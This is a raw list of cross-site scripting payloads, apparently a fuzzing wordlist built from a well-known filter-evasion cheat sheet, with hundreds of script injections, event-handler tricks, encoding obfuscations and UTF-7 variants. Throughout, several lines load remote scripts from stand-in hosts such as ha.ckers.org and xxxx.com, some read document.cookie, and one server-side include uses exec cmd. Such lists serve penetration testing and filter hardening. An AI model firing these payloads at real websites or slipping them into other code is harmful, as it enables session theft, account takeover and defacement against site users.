&lt;!&#91;endif&#93;--&gt;
&lt;BASE HREF=\"javascript&#058;alert('XSS');//\"&gt;
&lt;OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/OBJECT&gt;
&lt;OBJECT classid=clsid&#58;ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript&#058;alert('XSS')&gt;&lt;/OBJECT&gt;
&lt;EMBED SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;swf\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;
&lt;EMBED SRC=\"data&#58;image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;
a=\"get\";
b=\"URL(\\"\";
c=\"javascript&#058;\";
d=\"alert('XSS');\\")\";
eval(a+b+c+d);
&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\"xss\" implementation=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\"&gt;&lt;xss&#58;xss&gt;XSS&lt;/xss&#58;xss&gt;&lt;/HTML&gt;
&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\"javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;alert('XSS');\"&gt;&#93;&#93;&gt;
&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
&lt;XML ID=\"xss\"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=\"javas&lt;!-- --&gt;cript&#58;alert('XSS')\"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
&lt;SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"&gt;&lt;/SPAN&gt;
&lt;XML SRC=\"xsstest&#46;xml\" ID=I&gt;&lt;/XML&gt;
&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
&lt;HTML&gt;&lt;BODY&gt;
&lt;?xml&#58;namespace prefix=\"t\" ns=\"urn&#58;schemas-microsoft-com&#58;time\"&gt;
&lt;?import namespace=\"t\" implementation=\"#default#time2\"&gt;
&lt;t&#58;set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\"&gt;
&lt;/BODY&gt;&lt;/HTML&gt;
&lt;SCRIPT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;jpg\"&gt;&lt;/SCRIPT&gt;
&lt;!--#exec cmd=\"/bin/echo '&lt;SCR'\"--&gt;&lt;!--#exec cmd=\"/bin/echo 'IPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;'\"--&gt;
&lt;? echo('&lt;SCR)';
echo('IPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;'); ?&gt;
&lt;IMG SRC=\"http&#58;//www&#46;thesiteyouareon&#46;com/somecommand&#46;php?somevariables=maliciouscode\"&gt;
Redirect 302 /a&#46;jpg http&#58;//victimsite&#46;com/admin&#46;asp&deleteuser
&lt;META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\"&gt;
&lt;HEAD&gt;&lt;META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
&lt;SCRIPT a=\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT =\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=\"&gt;\" '' SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT \"a='&gt;'\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=`&gt;` SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=\"&gt;'&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT&gt;document&#46;write(\"&lt;SCRI\");&lt;/SCRIPT&gt;PT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;A HREF=\"http&#58;//66&#46;102&#46;7&#46;147/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//1113982867/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//0x42&#46;0x0000066&#46;0x7&#46;0x93/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//0102&#46;0146&#46;0007&#46;00000223/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"htt p&#58;//6 6&#46;000146&#46;0x7&#46;147/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"//www&#46;google&#46;com/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"//google\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//ha&#46;ckers&#46;org@google\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//google&#58;ha&#46;ckers&#46;org\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//google&#46;com/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//www&#46;google&#46;com&#46;/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"javascript&#058;document&#46;location='http&#58;//www&#46;google&#46;com/'\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//www&#46;gohttp&#58;//www&#46;google&#46;com/ogle&#46;com/\"&gt;XSS&lt;/A&gt;
&lt;
%3C
&lt
&lt;
&LT
&LT;
&#60
&#060
&#0060
&#00060
&#000060
&#0000060
&lt;
&#x3c
&#x03c
&#x003c
&#x0003c
&#x00003c
&#x000003c
&#x3c;
&#x03c;
&#x003c;
&#x0003c;
&#x00003c;
&#x000003c;
&#X3c
&#X03c
&#X003c
&#X0003c
&#X00003c
&#X000003c
&#X3c;
&#X03c;
&#X003c;
&#X0003c;
&#X00003c;
&#X000003c;
&#x3C
&#x03C
&#x003C
&#x0003C
&#x00003C
&#x000003C
&#x3C;
&#x03C;
&#x003C;
&#x0003C;
&#x00003C;
&#x000003C;
&#X3C
&#X03C
&#X003C
&#X0003C
&#X00003C
&#X000003C
&#X3C;
&#X03C;
&#X003C;
&#X0003C;
&#X00003C;
&#X000003C;
\x3c
\x3C
\u003c
\u003C
&lt;iframe src=http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html&gt;
&lt;IMG SRC=\"javascript&#058;alert('XSS')\"
&lt;SCRIPT SRC=//ha&#46;ckers&#46;org/&#46;js&gt;
&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js?&lt;B&gt;
&lt;&lt;SCRIPT&gt;alert(\"XSS\");//&lt;&lt;/SCRIPT&gt;
&lt;SCRIPT/SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;BODY onload!#$%&()*~+-_&#46;,&#58;;?@&#91;/|\&#93;^`=alert(\"XSS\")&gt;
&lt;SCRIPT/XSS SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;IMG SRC=\"   javascript&#058;alert('XSS');\"&gt;
perl -e 'print \"&lt;SCR\0IPT&gt;alert(\\"XSS\\")&lt;/SCR\0IPT&gt;\";' &gt; out
perl -e 'print \"&lt;IMG SRC=java\0script&#058;alert(\\"XSS\\")&gt;\";' &gt; out
&lt;IMG SRC=\"jav&#x0D;ascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=\"jav&#x0A;ascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=\"jav&#x09;ascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29&gt;
&lt;IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041&gt;
&lt;IMG SRC=javascript&#058;alert('XSS')&gt;
&lt;IMG SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;
&lt;IMG \"\"\"&gt;&lt;SCRIPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;\"&gt;
&lt;IMG SRC=`javascript&#058;alert(\"RSnake says, 'XSS'\")`&gt;
&lt;IMG SRC=javascript&#058;alert(&quot;XSS&quot;)&gt;
&lt;IMG SRC=JaVaScRiPt&#058;alert('XSS')&gt;
&lt;IMG SRC=javascript&#058;alert('XSS')&gt;
&lt;IMG SRC=\"javascript&#058;alert('XSS');\"&gt;
&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;
'';!--\"&lt;XSS&gt;=&{()}
';alert(String&#46;fromCharCode(88,83,83))//\';alert(String&#46;fromCharCode(88,83,83))//\";alert(String&#46;fromCharCode(88,83,83))//\\";alert(String&#46;fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(String&#46;fromCharCode(88,83,83))&lt;/SCRIPT&gt;
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
'';!--"<XSS>=&{()}
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=javascrscriptipt:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC=" &#14;  javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
\";alert('XSS');//
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
�script�alert(�XSS�)�/script�
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
<DIV STYLE="width: expression(alert('XSS'));">
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
<XSS STYLE="xss:expression(alert('XSS'))">
exp/*<A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<form id="test" /><button form="test" formaction="javascript:alert(123)">TESTHTML5FORMACTION
<form><button formaction="javascript:alert(123)">crosssitespt
<frameset onload=alert(123)>
<!--<img src="--><img src=x onerror=alert(123)//">
<style><img src="</style><img src=x onerror=alert(123)//">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<embed src="javascript:alert(1)">
<? foo="><script>alert(1)</script>">
<! foo="><script>alert(1)</script>">
</ foo="><script>alert(1)</script>">
<script>({0:#0=alert/#0#/#0#(123)})</script>
<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(123)}),x</script>
<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>
<script src="#">{alert(1)}</script>;1
<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>
<svg xmlns="#"><script>alert(1)</script></svg>
<svg onload="javascript:alert(123)" xmlns="#"></svg>
<iframe xmlns="#" src="javascript:alert(1)"></iframe>
+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-
%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-
+ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
%253cscript%253ealert(document.cookie)%253c/script%253e
�><s�%2b�cript>alert(document.cookie)</script>
�><ScRiPt>alert(document.cookie)</script>
�><<script>alert(document.cookie);//<</script>
foo<script>alert(document.cookie)</script>
<scr<script>ipt>alert(document.cookie)</scr</script>ipt>
%22/%3E%3CBODY%20onload=�document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)�%3E
�; alert(document.cookie); var foo=�
foo\�; alert(document.cookie);//�;
</script><script >alert(document.cookie)</script>
<img src=asdf onerror=alert(document.cookie)>
<BODY ONLOAD=alert(�XSS�)>
<script>alert(1)</script>
"><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
><img id=XSS SRC=x onerror=alert(XSS);>
;!--"<XSS>=&{()}"
<IMG id=XSS SRC="javascript:alert('XSS');">
<IMG id=XSS SRC=javascript:alert('XSS')>
<IMG id=XSS SRC=JaVaScRiPt:alert('XSS')>
<IMG id=XSS SRC=javascript:alert("XSS")>
<IMG id=XSS SRC=`javascript:alert("'XSS'")`>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG id=XSS SRC="jav ascript:alert('XSS');">
<IMG id=XSS SRC="jav    ascript:alert('XSS');">
<IMG id=XSS SRC="javascript:alert('XSS');">
<IMG id=XSS SRC="jav
ascript:alert('XSS');">
perl -e 'print "<IMG id=XSS SRC=java\0script:alert(\"XSS\")>";' > out
<IMG id=XSS SRC="  javascript:alert('XSS');">
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<<SCRIPT>alert("XSS");//<</SCRIPT>
\";alert('XSS');//
<IMG id=XSS SRC='javascript:alert('XSS')
<SCRIPT>alert(/XSS/.source)</SCRIPT>
<BODY BACKGROUND="javascript:alert('XSS')">
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
<INPUT TYPE="IMAGE" id=XSS SRC="javascript:alert('XSS');">
<BODY ONLOAD=alert('XSS')>
<IMG DYN id=XSS SRC="javascript:alert('XSS')">
<IMG LOW id=XSS SRC="javascript:alert('XSS')">
<BGSOUND id=XSS SRC="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<IMG id=XSS SRC='vbscript:msgbox("XSS")'>
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<TABLE id=XSS BACKGROUND="javascript:alert('XSS')">
<TABLE id=XSS><TD BACKGROUND="javascript:alert('XSS')">
<DIV id=XSS STYLE="background-image: url(javascript:alert('XSS'))">
<DIV id=XSS STYLE="width: expression(alert('XSS'));">
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<IFRAME id=XSS SRC="javascript:alert('XSS');"></IFRAME>
<FRAMESET><FRAME id=XSS SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">"
<DIV id=XSS STYLE="background-image: url(javascript:alert('XSS'))">
<DIV id=XSS STYLE="width: expression(alert('XSS'));">
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG id=XSS STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<BASE HREF="javascript:alert('XSS');//">
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);
<XML id=XSS><X><C><![CDATA[<IMG id=XSS SRC="javas]]><![CDATA[cript:alert('XSS');">]]></C></X><xml><SPAN DATAid=XSS SRC=#I DATAFLD=CDATAFORMATAS=HTML></SPAN>
<XML ID="XSS"><I><B><IMG id=XSS SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML><SPAN DATAid=XSS SRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
<XML id=XSS SRC="xsstest.xml" ID=I></XML><SPAN DATAid=XSS SRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>"></BODY></HTML>
<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
<SCRIPT id=XSS SRC=http://127.0.0.1></SCRIPT>
//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
<IMG id=XSS SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG id=XSS SRC="&14;javascript:alert('XSS');">
<SCRIPT <B>=alert('XSS');"></SCRIPT>
<IFRAME id=XSS SRC="javascript:alert('XSS'); <
<SCRIPT>a=/XSS/nalert('XSS');</SCRIPT>
<STYLE>li {list-style-image: url("javascript:alert('XSS');</STYLE><UL><LI>XSS
<DIV STYLE="background-image: url(javascript:alert('XSS'));">
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"></HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
<a href="javascript#alert('XSS');">
<div onmouseover="alert('XSS');">,
<input type="image" dynid=XSS SRC="javascript:alert('XSS');">
&<script>alert('XSS');</script>">
<IMG id=XSS SRC=&{alert('XSS');};>
<a id=XSS href="about:<script>alert('XSS');</script>">
<DIV id=XSS STYLE="binding: url(javascript:alert('XSS'));">
<OBJECT classid=clsid:..." codebase="javascript:alert('XSS');">
<style><!--</style><script>alert('XSS');//--></script>
![CDATA[<!--]]<script>alert('XSS');//--></script>
<!-- -- --><script>alert('XSS');</script><!-- -- -->
<img id=XSS SRC="blah"onmouseover="alert('XSS');">
<img id=XSS SRC="blah>"onmouseover="alert('XSS');">
<xml id="X"><a><b><script>alert('XSS');</script>;<b></a></xml>
<div datafld="b" dataformatas="html" dataid=XSS SRC="#XSS"></div>
[\xC0][\xBC]script>alert('XSS');[\xC0][\xBC]/script>
<XML ID=I><X><C><![CDATA[<IMG id=XSS SRC="javas]]<![CDATA[cript:alert('XSS');">]]</C><X></xml>
<form id="test" /><button form="test" formaction="javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32))">X
<input id=XSS onfocus=javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>
<select id=XSS onfocus=javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>
<textarea id=XSS onfocus=javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>
<keygen id=XSS onfocus=javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>
<input id=XSS onblur=javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus><input autofocus>
<video id=XSS poster=javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32))//
<body id=XSS onscroll=eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32))><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
<video><source onerror="javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32))">
<video onerror="javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32))"><source>
<iframe id=XSS / /onload=alert(/XSS/)></iframe>
<iframe id=XSS / "onload=alert(/XSS/)></iframe>
<iframe id=XSS///////onload=alert(/XSS/)></iframe>
<iframe id=XSS "onload=alert(/XSS/)></iframe>
<iframe id=XSS <?php echo chr(11)?> onload=alert(/XSS/)></iframe>
<iframe id=XSS <?php echo chr(12)?> onload=alert(/XSS/)></iframe>
" onfocus=alert(XSS) "> <"
" onblur=alert(XSS) "> <"
" onmouseover=alert(XSS) ">
" onclick=alert(XSS) ">
<FRAMESET><FRAME id=XSS SRC=\"javascript:alert('XSS');\"></FRAMESET>
<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS
</textarea>'"><script>alert(XSS)</script>
'""><script language="JavaScript"> alert('X \nS \nS');</script>
</script></script><<<<script><>>>><<<script>alert(XSS)</script>
<html><noalert><noscript>(XSS)</noscript><script>(XSS)</script>
<INPUT TYPE="IMAGE" id=XSS SRC="javascript:alert('XSS');">
'></select><script>alert(XSS)</script>
}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
<SCRIPT>document.write("XSS");</SCRIPT>
a="get";b="URL";c="javascript:";d="alert('xss');";eval(a+b+c+d);
='><script>alert("xss")</script>
<body background=javascript:'"><script>alert(XSS)</script>></body>
data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=
<SCRIPT>alert('XSS');</SCRIPT>
'';!--"<XSS>=&{()}
<SCRIPT id=XSS SRC=http://xxxx.com/xss.js></SCRIPT>
<IMG id=XSS SRC="javascript:alert('XSS');">
<IMG id=XSS SRC=javascript:alert('XSS')>
<IMG id=XSS SRC=JaVaScRiPt:alert('XSS')>
<IMG id=XSS SRC=javascript:alert("XSS")>
<IMG id=XSS SRC=`javascript:alert("RSnake says, 'XSS'")`>
<IMG id=XSS SRC=javascript:alert(String.fromCharCode(88,83,83))>
id=XSS SRC=<IMG 6;avascript:alert('XSS')>
<IMG id=XSS SRC=javascript:alert('XSS')>
<IMG id=XSS SRC=javascript:alert('XSS')>
<IMG id=XSS SRC="jav ascript:alert('XSS');">
<IMG id=XSS SRC="jav    ascript:alert('XSS');">
<IMG id=XSS SRC="javascript:alert('XSS');">
<IMG id=XSS SRC="jav
ascript:alert('XSS');">
<IMG id=XSS SRC="  javascript:alert('XSS');">
<SCRIPT/XSS id=XSS SRC="http://xxxx.com/xss.js"></SCRIPT>
<SCRIPT id=XSS SRC=http://xxxx.com/xss.js?<B>
<IMG id=XSS SRC="javascript:alert('XSS')"
<SCRIPT>a=/XSS/
\";alert('XSS');//
<INPUT TYPE="IMAGE" id=XSS SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<BODY ONLOAD=alert('XSS')>
<IMG DYNid=XSS SRC="javascript:alert('XSS')">
<IMG LOWid=XSS SRC="javascript:alert('XSS')">
<BGSOUND id=XSS SRC="javascript:alert('XSS');">
<BR SIZE="&{alert('XSS')}">
<LAYER id=XSS SRC="http://xxxx.com/scriptlet.html"></LAYER>
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="http://xxxx.com/xss.css">
<STYLE>@import'http://xxxx.com/xss.css';</STYLE>
<META HTTP-EQUIV="Link" Content="<http://xxxx.com/xss.css>; REL=stylesheet">
<STYLE>BODY{-moz-binding:url("http://xxxx.com/xssmoz.xml#xss")}</STYLE>
<IMG id=XSS SRC='vbscript:msgbox("XSS")'>
<IMG id=XSS SRC="mocha:[code]">
<IMG id=XSS SRC="livescript:[code]">
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<META HTTP-EQUIV="Link" Content="<javascript:alert('XSS')>; REL=stylesheet">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<IFRAME id=XSS SRC="javascript:alert('XSS');"></IFRAME>
<FRAMESET><FRAME id=XSS SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
<XSS STYLE="xss:expression(alert('XSS'))">
exp/*<XSS STYLE='no\xss:noxss("*//*");
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<BASE HREF="javascript:alert('XSS');//">
<OBJECT TYPE="text/x-scriptlet" DATA="http://xxxx.com/scriptlet.html"></OBJECT>
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
getURL("javascript:alert('XSS')")
a="get";
<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG id=XSS SRC="javas<![CDATA[cript:alert('XSS');">
<XML id=XSS SRC="http://xxxx.com/xsstest.xml" ID=I></XML>
<HTML><BODY>
<SCRIPT id=XSS SRC="http://xxxx.com/xss.jpg"></SCRIPT>
<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://xxxx.com/xss.js></SCRIPT>'"-->
<? echo('<SCR)';
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
<SCRIPT a=">" id=XSS SRC="http://xxxx.com/xss.js"></SCRIPT>
<SCRIPT a=">" '' id=XSS SRC="http://xxxx.com/xss.js"></SCRIPT>
<SCRIPT "a='>'" id=XSS SRC="http://xxxx.com/xss.js"></SCRIPT>
<SCRIPT a=`>` id=XSS SRC="http://xxxx.com/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT id=XSS SRC="http://xxxx.com/xss.js"></SCRIPT>
<sCrIpt>alert(1)</ScRipt>
<iMg srC=1 lAnGuAGE=VbS oNeRroR=mSgbOx(1)>
Null-byte character between HTML attribute name and equal sign (IE, Safari).
<img src='1' onerror\x00=alert(0) />
Slash character between HTML attribute name and equal sign (IE, Firefox, Chrome, Safari).
<img src='1' onerror/=alert(0) />
Vertical tab between HTML attribute name and equal sign (IE, Safari).
<img src='1' onerror\x0b=alert(0) />
